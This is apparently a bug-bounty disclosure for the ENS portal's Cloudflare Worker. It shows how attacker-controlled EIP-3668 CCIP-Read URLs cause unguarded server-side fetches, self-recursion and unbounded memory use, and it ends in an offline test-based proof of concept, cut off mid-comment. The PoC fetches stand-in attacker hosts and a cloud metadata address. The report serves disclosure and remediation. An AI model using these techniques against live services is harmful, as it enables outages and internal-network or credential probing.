# 92934 w a medium unauthenticated server side egress from the ens portal worker via eip 3668 ccip read leads to ressource exhaustion

## #92934 \[W\&A-Medium] Unauthenticated server-side egress from the ENS Portal Worker via EIP-3668 CCIP-Read leads to ressource exhaustion

**Submitted on Sep 13th 2026 at 10:23:47 UTC by @spryon for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92934
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Taking down the application/website

### Description

#### 1. Attacker input reaches server-side name resolution, unauthenticated

Two routes pass a URL-supplied name into `fetchEnsData`:

* [`apps/portal/src/worker.ts:169`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker.ts#L169) — the OG-image route, `/og/<name>.png`
* [`apps/portal/src/worker.ts:252`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker.ts#L252) — SSR meta-tag injection for `/<name>` pages

Both are plain `GET`s with no authentication and no wallet interaction. [`apps/portal/wrangler.jsonc:9-15`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/wrangler.jsonc#L9-L15) routes essentially everything through the Worker, with only four static prefixes excluded:

```jsonc
"run_worker_first": ["/*", "!/assets/*", "!/fonts/*", "!/icons/*", "!/client/*"]
```

`fetchEnsData` then resolves the attacker's name on the Worker's own egress ([`apps/portal/src/worker/ens.ts:142-147`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/ens.ts#L142-L147)):

```ts
const [records, owner] = await Promise.all([
  getRecords(client, { name, texts: ['avatar', 'description'] }).catch(() => null),
  resolveOwner(client, name),
])
```

#### 2. The client leaves CCIP-Read enabled

[`apps/portal/src/worker/clients.ts:15-23`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/clients.ts#L15-L23):

```ts
return createPublicClient({
  chain: sepoliaWithEns,
  transport: fallback(urls.map((url) => http(url, { retryCount: 2 })),
                      { rank: false, retryCount: 2 }),
  batch: { multicall: true },
})
```

There is no `ccipRead` key and no `gatewayUrls` pin. A repo-wide grep across `apps/`, `packages/` and `workers/` (excluding `node_modules`) returns **zero** occurrences of `ccipRead`. The only `gatewayUrls` occurrences are ensjs's unrelated `AssetGatewayUrls` (IPFS/Arweave asset gateways) in [`apps/manager/src/features/profile/service/profileImageRecord.ts:23-44`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/profile/service/profileImageRecord.ts#L23-L44). No application code anywhere configures CCIP-Read behaviour.

#### 3. viem follows the attacker's URLs

Because `ccipRead` is `undefined`, the gate in viem 2.52.2 `node_modules/viem/_esm/actions/public/call.js:166-171` ([source](https://github.com/wevm/viem/blob/viem%402.52.2/src/actions/public/call.ts)) opens on any revert carrying the `OffchainLookup` selector `0x556f1830`:

```js
if (client.ccipRead !== false &&
    data?.slice(0, 10) === offchainLookupSignature && to)
  return { data: await offchainLookup(client, { data, requestOptions, to }) };
```

`offchainLookup` decodes the revert and hands the URLs to `ccipRequest`, whose entire request is (`node_modules/viem/_esm/utils/ccip.js:95`, [source](https://github.com/wevm/viem/blob/viem%402.52.2/src/utils/ccip.ts)):

```js
const method = url.includes('{data}') ? 'GET' : 'POST';
const body = method === 'POST' ? { data, sender } : undefined;
const response = await fetch(
  url.replace('{sender}', sender.toLowerCase()).replace('{data}', data),
  { body: JSON.stringify(body), headers, method,
    ...(requestOptions?.signal ? { signal: requestOptions.signal } : {}) });
```

`url` is a raw attacker-authored string. The attacker also selects the method: including `{data}` yields `GET`, omitting it yields `POST` with a JSON body. No `signal` is passed (no timeout) and no `redirect` option is set (redirects are followed by default and never revalidated).

viem applies exactly one check, in `offchainLookup` — `isAddressEqual(to, sender)`, i.e. the `sender` named in the revert must equal the contract that was called. The attacker controls that contract and simply emits the matching address. It is not a barrier.

#### 4. The batch gateway runs in-process, so the fan-out is on the Worker

This is the step that makes the Worker — rather than a remote trusted aggregator — the entity performing the requests. The UniversalResolver does not hand the client the per-name URLs directly; it emits the local-batch-gateway sentinel wrapping a nested `query()`. viem executes that batch gateway **in-process** (`node_modules/viem/_esm/utils/ens/localBatchGatewayRequest.js:6,14-16`, [source](https://github.com/wevm/viem/blob/viem%402.52.2/src/utils/ens/localBatchGatewayRequest.ts)):

```js
export const localBatchGatewayUrl = 'x-batch-gateway:true';
...
responses[i] = query.urls.includes(localBatchGatewayUrl)
  ? await localBatchGatewayRequest({ data: query.data, ccipRequest })
  : await ccipRequest(query);      // <-- per-resolver fetch, on this Worker
```

#### 5. Why the existing mitigation does not cover this path

[`apps/portal/src/worker/safe-fetch.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/safe-fetch.ts) implements exactly the guards that are missing: https-only ([`:85`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/safe-fetch.ts#L85)), no credentials ([`:86`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/safe-fetch.ts#L86)), no IP literals ([`:87`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/safe-fetch.ts#L87)), self-host ban ([`:88-90`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/safe-fetch.ts#L88-L90)), manual redirects revalidated per hop, a shared 20 s deadline, and a **mandatory** response size cap (`maxBytes` is a required field of `SafeFetchOptions` at [`:136`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/safe-fetch.ts#L136), enforced streaming by `readCapped` at [`:107-123`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/safe-fetch.ts#L107-L123), which cancels the upstream rather than draining it).

It has exactly two call sites, both on the avatar path: [`ens.ts:65`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/ens.ts#L65) (5 MiB cap, [`ens.ts:19`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/ens.ts#L19)) and [`avatar.ts:228`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/avatar.ts#L228) (256 KiB cap, [`avatar.ts:44`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/avatar.ts#L44)).

The CCIP fetch happens several frames inside viem, during *name resolution*, before application code regains control. The shipped fix is therefore not merely incomplete on this path — it is architecturally incapable of covering it. This is the "bypass of a shipped fix = new finding" case for **R2-04**, whose scope is the avatar URL vector only.

**The project already identified this mechanism and mitigated it for the browser.** [`apps/portal/src/worker/csp.ts:118-132`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/csp.ts#L118-L132) states:

> CCIP-Read (ERC-3668) gateways — viem follows the UniversalResolver's OffchainLookup reverts from the browser, so every gateway origin must be allowlisted \[…] The UR hands out the ENS batch gateway (ccip-v3.ens.xyz \[…]) tagged `x-batch-gateway:true`, which makes viem fan the batch out to the per-chain verifier gateways directly from the browser

followed by the allowlist `https://*.ens.xyz`, `https://*.3668.io`, `https://lb.drpc.org` ([`csp.ts:130-132`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/csp.ts#L130-L132)). The browser is constrained to that set by `connect-src`; the Worker performs the same fan-out with no equivalent control.

#### 6. Attacker prerequisites

Own any ENS name whose resolution path reaches a contract the attacker controls (a custom resolver or a V2 subregistry) which reverts `OffchainLookup(sender, urls, callData, callbackFunction, extraData)` with `sender` set to the calling contract's address — a public constant (`0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe` on Sepolia).

No authentication, no user interaction, no connected wallet. The attacker then causes `https://<portal-host>/og/<their-name>.png` to be requested — or simply waits, since any crawler, link unfurler or social-media preview fetch does it for them.

### Impact Details

#### Selected impact: Taking down the application/website

Two distinct primitives support this, both corresponding to guards the codebase already implements one call path away.

**A. Self-recursion amplification.** `urls` may name the Portal's own host, e.g. `https://<portal-host>/og/<wildcard-name>.png`. Each OG render then triggers another OG render server-side, and wildcard subnames supply unlimited cache-distinct URLs, so the CDN never absorbs the repeats. One inbound request becomes N server-side requests with N attacker-chosen.

The decisive point is not that recursion is conceivable — it is that `safe-fetch.ts` carries a `selfHost` guard for precisely this reason, and this path has none. That file's own docblock states the rationale: *"an avatar pointing back at `/og/<name>` would make the worker recurse into itself, with each hop spawning a fresh invocation."* The threat was identified and mitigated for avatars; the identical primitive on the resolution path is unguarded.

The PoC demonstrates same-host re-entry with a test-imposed cap of 3 so the suite terminates. An uncapped run of the same fixture reached **2,864 server-side fetches from a single inbound request** before being stopped manually.

**B. Unbounded response buffering.** viem calls `response.json()` / `response.text()` with no cap and no streaming check. Response size is attacker-controlled, because it is the attacker's gateway. The PoC measures both consumers against the **same 16 MiB body**, counting chunks actually pulled off the wire:

| consumer                        | pulled (64 KiB chunks) | outcome                                      |
| ------------------------------- | ---------------------- | -------------------------------------------- |
| `safeFetch` (`maxBytes: 5 MiB`) | 82 of 256              | stops at cap, cancels stream, returns `null` |
| viem CCIP                       | **256 of 256**         | entire body buffered                         |

Cloudflare Workers isolates have a hard **128 MB** ceiling covering both the JS heap and WebAssembly allocations, and isolates are shared across requests and users. This is unbounded attacker-controlled allocation into that budget, requiring no traffic volume — a single large response body. The same Worker enforces a 256 KiB ceiling on NFT metadata while accepting an unbounded body here.

Because the Worker also serves the SPA HTML (`run_worker_first: ["/*", …]`), degradation is not limited to images — it affects the site.

#### Additional consequences of the same defect

* **Arbitrary `GET`/`POST` egress from ENS infrastructure**, method attacker-selected.
* **Out-of-band exfiltration channel** — the attacker authors the full URL and viem substitutes `{sender}` and `{data}` into it.
* **No timeout and unrevalidated redirect following**, both asserted in the PoC.
* **Fan-out** — `urls[]` is attacker-chosen and unbounded; every entry is tried in order, and each of those N responses is itself uncapped.
* **Blind SSRF / host-and-port probing oracle** via response timing and error differentiation.

**I am not submitting this as a volumetric DoS.** The program excludes "DDoS-only", and neither primitive above is volumetric — B in particular needs no traffic at all. Both are missing-guard defects whose fixes are a few lines.

#### Recommended fix

Preferred — route CCIP requests through the guard that already exists, constrained to the gateway set already enumerated in `csp.ts:130-132`:

```ts
createPublicClient({
  chain: sepoliaWithEns,
  transport: fallback(...),
  batch: { multicall: true },
  ccipRead: {
    request: async ({ data, sender, urls }) => {
      // reject any URL whose origin is not in the csp.ts allowlist
      // (*.ens.xyz, *.3668.io, lb.drpc.org), then fetch under
      // safeFetch-style guards: https-only, no IP literals, manual
      // redirects, shared deadline, and a maxBytes cap.
    },
  },
})
```

Alternatives: pass explicit `gatewayUrls` so ensjs calls `resolveWithGateways` rather than following revert-supplied URLs; or set `ccipRead: false` if OG cards need not render offchain/L2 names — though per the project's own CSP comment that would break "L2 primary-name verification \[…] and every name resolving through a CCIP-read resolver".

Two related notes: the same fix should be applied to [`workers/api-worker/src/core/eth/client.ts:28`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/core/eth/client.ts#L28), which has the identical shape (no `ccipRead`) and is one new unauthenticated resolution endpoint away from the same exposure; and `safe-fetch.ts`'s `selfHost` check compares a single host string, which with `preview_urls: true` in `wrangler.jsonc` can be sidestepped by naming a different hostname that routes to the same Worker.

### References

All repository links are permalinks pinned to commit [`1c9b47f`](https://github.com/immunefi-team/audit-comp-ens/commit/1c9b47f18fcddd2e864dfe385c4171061c9811ae) on branch `audit-comp-ready`.

**Vulnerable code**

* [`apps/portal/src/worker.ts#L169`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker.ts#L169) — OG-image entry point, unauthenticated
* [`apps/portal/src/worker.ts#L252`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker.ts#L252) — SSR meta-tag entry point, unauthenticated
* [`apps/portal/src/worker/clients.ts#L15-L23`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/clients.ts#L15-L23) — client built without `ccipRead`
* [`apps/portal/src/worker/ens.ts#L142-L147`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/ens.ts#L142-L147) — server-side resolution of the attacker's name
* [`apps/portal/wrangler.jsonc#L9-L15`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/wrangler.jsonc#L9-L15) — `run_worker_first` routing

**The guard that does not apply**

* [`apps/portal/src/worker/safe-fetch.ts#L74-L93`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/safe-fetch.ts#L74-L93) — `checkFetchableUrl`: scheme, credentials, IP-literal, self-host
* [`apps/portal/src/worker/safe-fetch.ts#L107-L123`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/safe-fetch.ts#L107-L123) — `readCapped`, streaming size cap with upstream cancellation
* [`apps/portal/src/worker/safe-fetch.ts#L136`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/safe-fetch.ts#L136) — `maxBytes` is a required option
* [`apps/portal/src/worker/ens.ts#L65`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/ens.ts#L65) and [`#L19`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/ens.ts#L19) — call site 1, avatar, 5 MiB cap
* [`apps/portal/src/worker/avatar.ts#L228`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/avatar.ts#L228) and [`#L44`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/avatar.ts#L44) — call site 2, NFT metadata, 256 KiB cap

**The project's own documentation of this mechanism**

* [`apps/portal/src/worker/csp.ts#L118-L132`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/worker/csp.ts#L118-L132) — browser-side CCIP gateway allowlist and rationale

**Same defect shape, not currently reachable (fix recommended anyway)**

* [`workers/api-worker/src/core/eth/client.ts#L28`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/core/eth/client.ts#L28) — second client, also without `ccipRead`

**Unrelated `gatewayUrls` occurrences, for grep disambiguation**

* [`apps/manager/src/features/profile/service/profileImageRecord.ts#L23-L44`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/profile/service/profileImageRecord.ts#L23-L44) — ensjs `AssetGatewayUrls` (IPFS/Arweave), not CCIP

**Third-party code — viem 2.52.2** (built files under `node_modules/viem/_esm/`; source links below are the matching published tag, where line numbers differ from the built output)

* [`src/actions/public/call.ts`](https://github.com/wevm/viem/blob/viem%402.52.2/src/actions/public/call.ts) — the `ccipRead !== false` gate (`_esm/actions/public/call.js:166-171`)
* [`src/utils/ccip.ts`](https://github.com/wevm/viem/blob/viem%402.52.2/src/utils/ccip.ts) — `ccipRequest`, unguarded `fetch` (`_esm/utils/ccip.js:85-142`, fetch at `:95`)
* [`src/utils/ens/localBatchGatewayRequest.ts`](https://github.com/wevm/viem/blob/viem%402.52.2/src/utils/ens/localBatchGatewayRequest.ts) — in-process batch gateway (`_esm/utils/ens/localBatchGatewayRequest.js:6,14-16`)

**Specifications and platform documentation**

* EIP-3668 (CCIP Read: Secure offchain data retrieval) — <https://eips.ethereum.org/EIPS/eip-3668>
* ENSIP-10 (Wildcard Resolution) — <https://docs.ens.domains/ensip/10>
* Cloudflare Workers limits (128 MB memory per isolate, covering JS heap and WebAssembly) — <https://developers.cloudflare.com/workers/platform/limits/>

### Proof of Concept

## PoC

Fully offline, hermetic, and deterministic. **10/10 assertions pass in \~1.8 s.**

The PoC drives the **real** `createClient()` and the **real** `fetchEnsData()` — the exact function `worker.ts:169` invokes for `/og/<name>.png` — through the **real** ensjs and viem resolution stack. Only the RPC layer is synthetic, and it reproduces the true UniversalResolver envelope (`['x-batch-gateway:true']` wrapping a nested `query((address sender, string[] urls, bytes data)[])`) rather than a simplified one. The production client's `batch: { multicall: true }` is preserved and asserted — the fixture rejects any call that is not `aggregate3`. Global `fetch` is stubbed and throws on any unexpected URL, so nothing can reach the network, including RPC fallbacks.

#### Setup and run

```bash
# from the repo root
cd apps/portal
# place the file below at src/worker/ccip-ssrf.poc.test.ts
npx vitest run src/worker/ccip-ssrf.poc.test.ts --reporter=verbose
```

#### What each assertion establishes

| Test                                                                       | Establishes                                                                                                                                                                                                                               |
| -------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `fetches an attacker-selected URL using POST` / `… using GET`              | The attacker's URL is fetched; method is attacker-chosen via `{data}`; POST body is `{data, sender}`; `signal` and `redirect` are both `undefined` (no timeout, redirects followed); the `eth_call` really targeted the UniversalResolver |
| `safeFetch blocks selfHost … but CCIP fetches the same URL`                | Self-recursion guard bypassed                                                                                                                                                                                                             |
| `safeFetch blocks scheme (https-only) …`                                   | `http:` reached                                                                                                                                                                                                                           |
| `safeFetch blocks isIpLiteral …`                                           | IP-literal host reached                                                                                                                                                                                                                   |
| `does NOT reach a user:pass@ URL`                                          | Honest negative — the runtime blocks this one, not the app                                                                                                                                                                                |
| `CCIP drains an oversized body in full; safeFetch cancels at its cap`      | Same 16 MiB body: `safeFetch` stops at 82/256 chunks and cancels; viem pulls 256/256                                                                                                                                                      |
| `tries every URL in urls[]`                                                | One resolution → N outbound requests, in attacker order                                                                                                                                                                                   |
| `can re-enter resolution before discovering the response is not CCIP data` | Same-host re-entry (capped at 3 — a *test* cap)                                                                                                                                                                                           |
| `does not fetch the gateway when CCIP is disabled`                         | **Negative control:** `ccipRead: false` ⇒ zero fetches. Establishes causation and validates the fix.                                                                                                                                      |

The three `safeFetch blocks …` cases are the core of the report: one URL, two code paths in the same Worker, one guarded and one not.

#### Observed output

```
 ✓ CCIP SSRF PoC (synthetic RPC, real ensjs/viem) > fetches an attacker-selected URL using POST 24ms
 ✓ CCIP SSRF PoC (synthetic RPC, real ensjs/viem) > fetches an attacker-selected URL using GET 8ms
 ✓ CCIP SSRF PoC (synthetic RPC, real ensjs/viem) > safeFetch blocks selfHost (OG self-recursion) but CCIP fetches the same URL 7ms
 ✓ CCIP SSRF PoC (synthetic RPC, real ensjs/viem) > safeFetch blocks scheme (https-only) but CCIP fetches the same URL 6ms
 ✓ CCIP SSRF PoC (synthetic RPC, real ensjs/viem) > safeFetch blocks isIpLiteral but CCIP fetches the same URL 6ms
 ✓ CCIP SSRF PoC (synthetic RPC, real ensjs/viem) > does NOT reach a user:pass@ URL — the runtime rejects it, not the app 6ms
 ✓ CCIP SSRF PoC (synthetic RPC, real ensjs/viem) > CCIP drains an oversized body in full; safeFetch cancels at its cap 391ms
 ✓ CCIP SSRF PoC (synthetic RPC, real ensjs/viem) > tries every URL in urls[] — one resolution, N outbound requests 6ms
 ✓ CCIP SSRF PoC (synthetic RPC, real ensjs/viem) > can re-enter resolution before discovering the response is not CCIP data 15ms
 ✓ CCIP SSRF PoC (synthetic RPC, real ensjs/viem) > does not fetch the gateway when CCIP is disabled (negative control) 5ms

 Test Files  1 passed (1)
      Tests  10 passed (10)
   Duration  1.77s
```

#### Complete PoC source

```ts
import { getChainContractAddress } from '@ensdomains/ensjs/chain'
import {
  createPublicClient,
  decodeFunctionData,
  encodeErrorResult,
  encodeFunctionData,
  encodeFunctionResult,
  fallback,
  type Hex,
  http,
  multicall3Abi,
  parseAbi,
} from 'viem'
import { afterEach, describe, expect, it, vi } from 'vitest'

// Isolate record resolution; owner reads are not needed to demonstrate CCIP.
// getRecords, createClient, multicall decoding and viem CCIP remain real.
vi.mock('@/utils/ens/resolveEnsOwner', () => ({
  resolveEnsOwner: vi.fn().mockResolvedValue(null),
}))

import * as clients from './clients'
import { fetchEnsData, resolveAvatarDataUri } from './ens'
import { safeFetch } from './safe-fetch'

const RPC_URL = 'https://rpc.example'
const SELF_HOST = 'portal.example'
const OG_URL = `https://${SELF_HOST}/og/evil.eth.png`
const env = { SEPOLIA_RPC_URL: RPC_URL } as Env
const ATTACKER_RESOLVER = '0x1111111111111111111111111111111111111111'
const CALL_DATA = '0x1234'

/** safe-fetch.ts caps avatar payloads at 5 MiB; we push more than that. */
const AVATAR_MAX_BYTES = 5 * 1024 * 1024

const offchainAbi = parseAbi([
  'error OffchainLookup(address sender, string[] urls, bytes callData, bytes4 callbackFunction, bytes extraData)',
])
const batchGatewayAbi = parseAbi([
  'function query((address sender, string[] urls, bytes data)[] queries) returns (bool[] failures, bytes[] responses)',
])

/** Mirror of viem `ccipRequest`'s template substitution. */
const resolveTemplate = (url: string) =>
  url
    .replace('{sender}', ATTACKER_RESOLVER.toLowerCase())
    .replace('{data}', CALL_DATA)

/**
 * Offline vulnerability characterization: passing means the unsafe behavior
 * exists. RPC responses are synthetic, including the Universal Resolver's
 * local-batch-gateway envelope. This does NOT establish that deployed contracts
 * emit this envelope or that Cloudflare routes a self-fetch into the Worker.
 * Every fetch is intercepted; no resolver deployment or live network is used.
 */
describe('CCIP SSRF PoC (synthetic RPC, real ensjs/viem)', () => {
  afterEach(() => {
    vi.restoreAllMocks()
    vi.unstubAllGlobals()
  })

  function installNetwork(
    gatewayUrls: string | string[],
    gatewayResponse: (url: string) => Promise<Response> = async () =>
      new Response('not CCIP data', { status: 502 }),
  ) {
    const urls = Array.isArray(gatewayUrls) ? gatewayUrls : [gatewayUrls]
    const client = clients.createClient(env)
    const universalResolver = getChainContractAddress({
      chain: client.chain,
      contract: 'ensUniversalResolver',
    })
    // The real Universal Resolver does NOT hand the client the attacker's URLs
    // directly: it emits the local-batch-gateway sentinel wrapping a nested
    // query() whose entries carry the per-resolver URLs. viem runs that batch
    // gateway IN-PROCESS (utils/ens/localBatchGatewayRequest.js), so the
    // per-resolver fan-out happens on the worker's own egress.
    const nestedQuery = encodeFunctionData({
      abi: batchGatewayAbi,
      functionName: 'query',
      args: [[{ sender: ATTACKER_RESOLVER, urls, data: CALL_DATA }]],
    })
    const offchainError = encodeErrorResult({
      abi: offchainAbi,
      errorName: 'OffchainLookup',
      args: [
        universalResolver,
        ['x-batch-gateway:true'],
        nestedQuery,
        '0x12345678',
        '0x',
      ],
    })

    const expected = new Map(urls.map((u) => [resolveTemplate(u), u]))
    /** Targets seen by the RPC leg, asserted after the run (never inside the mock). */
    const multicallTargets: string[] = []
    const gateway = vi.fn(gatewayResponse)
    const rpc = vi.fn()
    const fetchSpy = vi.fn<typeof fetch>(async (input, init) => {
      // Construct a Request for EVERY call, exactly as a real fetch() does.
      // This is load-bearing: it reproduces runtime-level rejections (notably
      // a URL carrying credentials, which throws here) instead of silently
      // letting the stub accept URLs the real runtime would refuse.
      const request = new Request(input, init)
      const rawUrl = request.url

      if (rawUrl === RPC_URL || rawUrl === `${RPC_URL}/`) {
        const payload = (await request.json()) as {
          id: number
          method: string
          params: [{ data: Hex }]
        }
        rpc(payload)
        // Preserve the production client's automatic multicall behavior.
        const decoded = decodeFunctionData({
          abi: multicall3Abi,
          data: payload.params[0].data,
        })
        if (decoded.functionName !== 'aggregate3') {
          throw new Error('Expected production client to use aggregate3')
        }
        const [calls] = decoded.args
        const result = encodeFunctionResult({
          abi: multicall3Abi,
          functionName: 'aggregate3',
          result: calls.map(({ target, callData }) => {
            multicallTargets.push(target.toLowerCase())
            // Only the initial resolve emits OffchainLookup. End callbacks
            // with an ordinary revert so the fixture cannot loop via RPC.
            return {
              success: false,
              returnData: callData.startsWith('0x12345678')
                ? '0x'
                : offchainError,
            }
          }),
        })
        return Response.json({ jsonrpc: '2.0', id: payload.id, result })
      }

      const match = expected.get(rawUrl)
      if (match !== undefined) return gateway(match)
      // Never fall through to the actual network, including RPC fallbacks.
      throw new Error(`Unexpected fetch in offline PoC: ${rawUrl}`)
    })
    vi.stubGlobal('fetch', fetchSpy)
    return { fetchSpy, gateway, rpc, universalResolver, multicallTargets }
  }

  const outboundCalls = (fetchSpy: ReturnType<typeof vi.fn>) =>
    fetchSpy.mock.calls.filter(
      ([input]) => !String(input).startsWith(RPC_URL),
    ) as [string, RequestInit | undefined][]

  it.each([
    ['POST', 'https://beacon.example/lookup'],
    ['GET', 'https://beacon.example/lookup?data={data}'],
  ])('fetches an attacker-selected URL using %s', async (method, url) => {
    const { fetchSpy, gateway, rpc, universalResolver, multicallTargets } =
      installNetwork(url)

    const result = await fetchEnsData(env, 'evil.eth', SELF_HOST)

    expect(rpc).toHaveBeenCalled()
    expect(gateway).toHaveBeenCalledTimes(1)
    // The eth_call really did target the Universal Resolver.
    expect(new Set(multicallTargets)).toEqual(
      new Set([universalResolver.toLowerCase()]),
    )

    const [outboundUrl, outboundInit] = outboundCalls(fetchSpy)[0]
    expect(outboundUrl).toBe(resolveTemplate(url))
    expect(outboundInit?.method).toBe(method)
    // Guard absence, asserted rather than narrated:
    expect(outboundInit?.signal).toBeUndefined() // no timeout
    expect(outboundInit?.redirect).toBeUndefined() // default: follow redirects
    if (method === 'POST') {
      expect(JSON.parse(String(outboundInit?.body))).toEqual({
        data: CALL_DATA,
        sender: ATTACKER_RESOLVER,
      })
    }
    // Catching a failed lookup hides the failure, but cannot undo the fetch.
    expect(result).toEqual({ avatar: null, description: null, owner: null })
  })

  // ---------------------------------------------------------------------------
  // safe-fetch.ts guard matrix. For each URL the avatar path refuses to fetch
  // at all, while the CCIP path fetches the very same URL. Same worker, same
  // egress, same attacker-controlled string — one guarded, one not.
  // ---------------------------------------------------------------------------
  it.each([
    ['selfHost (OG self-recursion)', OG_URL],
    ['scheme (https-only)', 'http://beacon.example/lookup'],
    ['isIpLiteral', 'https://169.254.169.254/latest/meta-data/'],
  ])(
    'safeFetch blocks %s but CCIP fetches the same URL',
    async (_guard, url) => {
      const { gateway } = installNetwork(url)

      // Avatar path: rejected before any network call.
      expect(
        await resolveAvatarDataUri(clients.createClient(env), url, SELF_HOST),
      ).toBeNull()
      expect(gateway).not.toHaveBeenCalled()

      // CCIP path: same URL, fetched.
      await fetchEnsData(env, 'evil.eth', SELF_HOST)
      expect(gateway).toHaveBeenCalledTimes(1)
    },
  )

  it('does NOT reach a user:pass@ URL — the runtime rejects it, not the app', async () => {
    // Honest negative. safe-fetch.ts rejects credentials explicitly; the CCIP
    // path has no such check, but `new Request()` throws a TypeError on a URL
    // carrying credentials, so the request never leaves. Recorded so the report
    // does not claim a bypass that the platform actually prevents.
    const { gateway } = installNetwork('https://user:pass@beacon.example/lookup')

    await fetchEnsData(env, 'evil.eth', SELF_HOST)

    expect(gateway).not.toHaveBeenCalled()
  })

  // ---------------------------------------------------------------------------
  // Response size cap. Measured as bytes actually pulled off the wire, so the
  // two paths are compared on the same oversized body rather than by argument.
  // ---------------------------------------------------------------------------
  const CHUNK_SIZE = 64 * 1024
  const CHUNKS = 256 // 16 MiB — >3x AVATAR_MAX_BYTES

  /** A body that reports how many chunks the consumer actually pulled. */
  function countingBody() {
    const state = { pulled: 0 }
    const body = new ReadableStream<Uint8Array>({
      pull(controller) {
        if (state.pulled >= CHUNKS) return controller.close()
        state.pulled += 1
        controller.enqueue(new Uint8Array(CHUNK_SIZE))
      },
    })
    return { state, response: () => new Response(body, {
      headers: { 'content-type': 'text/plain' },
    }) }
  }

  it('CCIP drains an oversized body in full; safeFetch cancels at its cap', async () => {
    // --- CCIP path: viem calls response.text()/json() with no cap at all. ---
    const ccip = countingBody()
    const ccipNet = installNetwork(
      'https://beacon.example/big',
      async () => ccip.response(),
    )

    await fetchEnsData(env, 'evil.eth', SELF_HOST)

    expect(ccipNet.gateway).toHaveBeenCalledTimes(1)
    expect(ccip.state.pulled).toBe(CHUNKS) // every byte buffered
    expect(ccip.state.pulled * CHUNK_SIZE).toBeGreaterThan(AVATAR_MAX_BYTES)

    vi.unstubAllGlobals()

    // --- Avatar path: identical body, through safeFetch's readCapped(). ---
    const guarded = countingBody()
    installNetwork('https://beacon.example/big', async () => guarded.response())

    const result = await safeFetch('https://beacon.example/big', {
      accept: () => true,
      maxBytes: AVATAR_MAX_BYTES,
    })

    expect(result).toBeNull() // oversized => rejected
    // Stopped early AND cancelled the stream rather than draining it. The
